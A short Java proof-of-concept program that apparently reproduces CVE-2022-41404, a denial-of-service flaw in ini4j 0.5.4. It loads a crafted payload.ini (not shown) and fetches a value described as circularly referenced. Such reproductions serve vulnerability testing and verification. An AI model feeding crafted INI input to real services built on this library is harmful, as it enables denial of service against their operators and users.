import org.ini4j.Ini;
import java.io.File;
import java.io.FileReader;

public class CVE202241404Demo {
    public static void main(String[] args) {
        try {
            System.out.println("Starting CVE-2022-41404 demonstration with ini4j 0.5.4");
            System.out.println("Loading payload.ini file...");
            // Sleep for 10 seconds
            Ini ini = new Ini();
            ini.load(new FileReader(new File("src/main/resources/payload.ini")));
            
            System.out.println("Attempting to fetch dopey's weight, which has a circular reference...");
            Thread.sleep(10000);
            String weight = ini.get("dopey").fetch("weight");
            System.out.println("Weight value: " + weight);
            
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }
} 
